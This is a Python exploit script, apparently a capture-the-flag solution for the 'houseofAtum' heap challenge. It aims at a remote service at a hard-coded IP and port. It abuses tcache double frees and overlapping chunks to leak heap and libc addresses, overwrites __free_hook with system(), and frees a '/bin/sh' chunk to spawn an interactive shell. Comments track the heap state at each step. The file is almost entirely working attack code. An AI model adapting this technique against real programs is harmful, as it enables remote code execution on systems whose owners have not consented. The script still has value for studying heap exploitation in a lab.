#coding:utf-8
from swpwn import *
# from pwn import *

io,elf,libc= init_pwn('./houseofAtum','libc.so.6',remote_detail=('60.205.224.216',9999))


libc_base = 0x00007ffff7ddc000
free_hook_offset = 0x3ed8e8
system_offset = 0x4f440 

def add(msg):
    sla('Your choice:','1')
    sa('Input the content:',str(msg))

def edit(idx,msg):
    sla('Your choice:','2')
    sla('Input the idx:',str(idx))
    sa('Input the content:',str(msg))

def delete(idx,clear):
    sla('Your choice:','3')
    sla('Input the idx',str(idx))
    sla('Clear?(y/n):',str(clear))

def show(idx):
    sla('Your choice:','4')
    sla('Input the idx:',str(idx))


add('A')
add('B'*2)

#  leak heap
delete('0','n')
delete('1','n')



show(1)
print ru('Content:')
heap_base = raddr()
heap_base = heap_base - 0x260
lg('heap_base: ',heap_base)

# raw_input('wait to debug')


for i in range(5):
    delete(0,'n')

delete(1,'y')
delete(0,'y')

# raw_input('wait to debug')

payload = "a"*0x30
payload += p64(0) + p64(0xa1)
payload += p64(heap_base + 0x30)
add(payload) #0

add('1') #

#next tcache = heapbase + 0x10
delete(1, "y")


#(0x50)   tcache_entry[3]: 0x555555757030
#(0xa0)   tcache_entry[8]: 0x5555557572a0 (overlap chunk with 0x555555757250(freed) )
add('1',)
delete(0,'y')

#(0x50)   tcache_entry[3]: 0x555555757260 (overlap chunk with 0x555555757250(freed) )
#(0xa0)   tcache_entry[8]: 0x5555557572a0 (overlap chunk with 0x555555757250(freed) )


payload = p64(0)*7 + p64(heap_base + 0x10)
edit(1, payload)

# write tcache_entry[3]: 0x555555757060 ---> 0x555555757010

#(0x50)   tcache_entry[3]: 0x555555757010
#(0xa0)   tcache_entry[8]: 0x5555557572a0 (overlap chunk with 0x555555757250(freed) )


add(p8(0x11))

#now free chunk 0x555555757000 to unsortbin
#addr                prev                size                 status              fd                bk
#0x555555757000      0x0                 0x250                Used                None              None
#0x555555757250      0x0                 0x50                 Freed                0x0              None
#0x5555557572a0      0x0                 0x50                 Used                None              None

for i in range(7):
    delete(0, "n")
delete(0, "y")


#now mov 0x555555757000 -> tcache

payload = p64(0)*7 + p64(heap_base + 0x10)
edit(1, payload)

#(0x50)   tcache_entry[3]: 0x555555757010 (overlap chunk with 0x555555757000(freed) )
#(0xa0)   tcache_entry[8]: 0x5555557572a0 (overlap chunk with 0x555555757250(freed) )
#(0x250)   tcache_entry[35]: 0x555555757010 (overlap chunk with 0x555555757000(freed) )

add(p8(0x11))

show(0)
print ru('Content:')
libc_base = raddr()+ 0xc143ef# - 0x3ebca0
lg('libc_base: ',libc_base)


free_hook  = libc_base + free_hook_offset
system_addr = libc_base + system_offset


delete(0,'y')
payload = p64(0)*7 + p64(free_hook-8)

edit(1, payload)

raw_input('wait to debug')

add("/bin/sh\x00" + p64(system_addr))
raw_input('wait to debug')


ru('Your choice:')
sl('3')
ru('Input the idx:')
sl('0')
io.interactive()